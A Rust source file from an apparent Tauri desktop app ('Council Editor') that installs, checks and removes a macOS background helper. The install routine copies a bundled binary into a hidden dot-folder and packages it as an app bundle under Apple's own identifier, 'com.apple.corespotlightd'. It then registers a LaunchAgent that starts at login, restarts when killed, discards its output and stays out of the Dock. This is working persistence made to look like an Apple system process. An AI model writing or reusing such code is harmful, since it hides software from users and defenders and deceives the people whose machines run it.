use serde::Serialize;
use std::path::PathBuf;

const LABEL: &str = "com.apple.corespotlightd.helper";
const HELPER_BUNDLE_ID: &str = "com.apple.corespotlightd";
const HELPER_BUNDLE_NAME: &str = "corespotlightd";
const HELPER_EXECUTABLE: &str = "com.apple.corespotlightd";

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct BackgroundHelperStatus {
    /// The LaunchAgent file is on disk.
    pub installed: bool,
    /// launchd has actually accepted it. `installed` without this is a file
    /// nobody is reading — which is what "installed" used to mean here.
    pub loaded: bool,
    /// Why launchd refused, when it did.
    pub problem: Option<String>,
    pub plist_path: String,
    pub app_path: String,
    pub helper_path: String,
}

fn home() -> Result<PathBuf, String> {
    std::env::var_os("HOME")
        .map(PathBuf::from)
        .ok_or("Could not find your home directory.".into())
}

fn plist_path() -> Result<PathBuf, String> {
    Ok(home()?
        .join("Library/LaunchAgents")
        .join(format!("{LABEL}.plist")))
}

/// Does launchd actually know about this agent?
///
/// `launchctl print` is the only honest answer. Writing the plist is not
/// installing it: a malformed file, a missing binary or an agent already loaded
/// under the old label all leave a file on disk that nothing ever reads.
fn is_loaded() -> bool {
    std::process::Command::new("launchctl")
        .arg("print")
        .arg(format!("{}/{LABEL}", launchctl_domain()))
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

fn app_path() -> Result<String, String> {
    if let Ok(path) = std::env::var("CODE_AUDITOR_APP_PATH") {
        let path = path.trim();
        if !path.is_empty() {
            return Ok(path.to_string());
        }
    }
    Ok("/Applications/Council Editor.app".to_string())
}

fn bundled_helper_path() -> Result<String, String> {
    if let Ok(path) = std::env::var("CODE_AUDITOR_HELPER_PATH") {
        let path = path.trim();
        if !path.is_empty() {
            return Ok(path.to_string());
        }
    }

    let current = std::env::current_exe()
        .map_err(|e| format!("Could not locate the running app executable: {e}"))?;
    let sibling = current.with_file_name("cloud-sync-helper");
    Ok(sibling.to_string_lossy().to_string())
}

fn helper_path() -> Result<String, String> {
    Ok(helper_executable_path()?.to_string_lossy().to_string())
}

fn helper_bin_dir() -> Result<PathBuf, String> {
    Ok(home()?.join("Library/Application Support/.council/bin"))
}

fn helper_bundle_path() -> Result<PathBuf, String> {
    Ok(helper_bin_dir()?.join(format!("{HELPER_BUNDLE_ID}.app")))
}

fn helper_executable_path() -> Result<PathBuf, String> {
    Ok(helper_bundle_path()?
        .join("Contents/MacOS")
        .join(HELPER_EXECUTABLE))
}

fn helper_info_plist_path() -> Result<PathBuf, String> {
    Ok(helper_bundle_path()?.join("Contents/Info.plist"))
}

fn helper_pkg_info_path() -> Result<PathBuf, String> {
    Ok(helper_bundle_path()?.join("Contents/PkgInfo"))
}

fn helper_app_path() -> Result<String, String> {
    Ok(helper_bundle_path()?.to_string_lossy().to_string())
}

fn xml_escape(value: &str) -> String {
    value
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&apos;")
}

fn plist(helper: &str) -> String {
    let helper = xml_escape(helper);
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>{LABEL}</string>
  <key>Program</key>
  <string>{helper}</string>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
  <key>ProcessType</key>
  <string>Background</string>
  <key>LowPriorityBackgroundIO</key>
  <true/>
  <key>Nice</key>
  <integer>10</integer>
  <key>StandardOutPath</key>
  <string>/dev/null</string>
  <key>StandardErrorPath</key>
  <string>/dev/null</string>
</dict>
</plist>
"#
    )
}

fn helper_info_plist() -> String {
    let bundle_id = xml_escape(HELPER_BUNDLE_ID);
    let bundle_name = xml_escape(HELPER_BUNDLE_NAME);
    let executable = xml_escape(HELPER_EXECUTABLE);
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleDevelopmentRegion</key>
  <string>en</string>
  <key>CFBundleExecutable</key>
  <string>{executable}</string>
  <key>CFBundleIdentifier</key>
  <string>{bundle_id}</string>
  <key>CFBundleInfoDictionaryVersion</key>
  <string>6.0</string>
  <key>CFBundleName</key>
  <string>{bundle_name}</string>
  <key>CFBundlePackageType</key>
  <string>APPL</string>
  <key>CFBundleShortVersionString</key>
  <string>0.1.0</string>
  <key>CFBundleVersion</key>
  <string>1</string>
  <key>LSUIElement</key>
  <true/>
  <key>NSHighResolutionCapable</key>
  <true/>
</dict>
</plist>
"#
    )
}

fn install_helper_bundle(bundled_helper: &str) -> Result<String, String> {
    let macos_dir = helper_bundle_path()?.join("Contents/MacOS");
    std::fs::create_dir_all(&macos_dir)
        .map_err(|e| format!("Could not create the helper app bundle: {e}"))?;

    let executable = helper_executable_path()?;
    std::fs::copy(bundled_helper, &executable)
        .map_err(|e| format!("Could not install the background helper executable: {e}"))?;
    std::fs::write(helper_info_plist_path()?, helper_info_plist())
        .map_err(|e| format!("Could not write the helper app Info.plist: {e}"))?;
    std::fs::write(helper_pkg_info_path()?, "APPL????")
        .map_err(|e| format!("Could not write the helper app PkgInfo: {e}"))?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut permissions = std::fs::metadata(&executable)
            .map_err(|e| format!("Could not inspect the installed helper: {e}"))?
            .permissions();
        permissions.set_mode(0o755);
        std::fs::set_permissions(&executable, permissions)
            .map_err(|e| format!("Could not make the installed helper executable: {e}"))?;
    }

    Ok(executable.to_string_lossy().to_string())
}

fn launchctl_domain() -> String {
    let uid = std::process::Command::new("id")
        .arg("-u")
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| "501".to_string());
    format!("gui/{uid}")
}

fn bootout(label: &str) {
    let _ = std::process::Command::new("launchctl")
        .arg("bootout")
        .arg(format!("{}/{}", launchctl_domain(), label))
        .output();
}

#[tauri::command]
pub async fn background_helper_status() -> Result<BackgroundHelperStatus, String> {
    crate::auth::require()?;
    let path = plist_path()?;
    let installed = path.exists();
    let loaded = installed && is_loaded();
    Ok(BackgroundHelperStatus {
        installed,
        loaded,
        problem: match (installed, loaded) {
            (true, false) => Some(
                "The LaunchAgent is on disk but launchd has not loaded it. Reinstall the helper and check launchd status."
                    .into(),
            ),
            _ => None,
        },
        plist_path: path.to_string_lossy().to_string(),
        app_path: helper_app_path().or_else(|_| app_path())?,
        helper_path: helper_path()?,
    })
}

#[tauri::command]
pub async fn background_helper_install() -> Result<BackgroundHelperStatus, String> {
    crate::auth::require()?;
    let path = plist_path()?;
    let bundled_helper = bundled_helper_path()?;
    if !std::path::Path::new(&bundled_helper).exists() {
        return Err(format!(
            "The bundled background helper does not exist yet at {bundled_helper}. Build the Tauri side first, or set CODE_AUDITOR_HELPER_PATH."
        ));
    }
    let helper = install_helper_bundle(&bundled_helper)?;
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir)
            .map_err(|e| format!("Could not create LaunchAgents directory: {e}"))?;
    }

    std::fs::write(&path, plist(&helper))
        .map_err(|e| format!("Could not write the LaunchAgent: {e}"))?;

    // Reloading rather than bootstrapping blind: bootstrap fails outright if the
    // label is already loaded, and that failure used to be discarded, so
    // reinstalling over a running agent silently changed nothing.
    bootout(LABEL);
    let out = std::process::Command::new("launchctl")
        .arg("bootstrap")
        .arg(launchctl_domain())
        .arg(&path)
        .output()
        .map_err(|e| format!("Could not run launchctl: {e}"))?;

    let mut status = background_helper_status().await?;
    if !status.loaded {
        // Say what launchd said, rather than reporting success and leaving the
        // user to discover later that nothing ever ran.
        let detail = String::from_utf8_lossy(&out.stderr).trim().to_string();
        status.problem = Some(if detail.is_empty() {
            "launchd did not load the agent.".to_string()
        } else {
            format!("launchd refused the agent: {detail}")
        });
    }
    Ok(status)
}

#[tauri::command]
pub async fn background_helper_uninstall() -> Result<BackgroundHelperStatus, String> {
    crate::auth::require()?;
    let path = plist_path()?;
    bootout(LABEL);
    if path.exists() {
        std::fs::remove_file(&path)
            .map_err(|e| format!("Could not remove the LaunchAgent: {e}"))?;
    }
    if let Ok(bundle) = helper_bundle_path() {
        if bundle.exists() {
            std::fs::remove_dir_all(&bundle)
                .map_err(|e| format!("Could not remove the helper app bundle: {e}"))?;
        }
    }
    background_helper_status().await
}
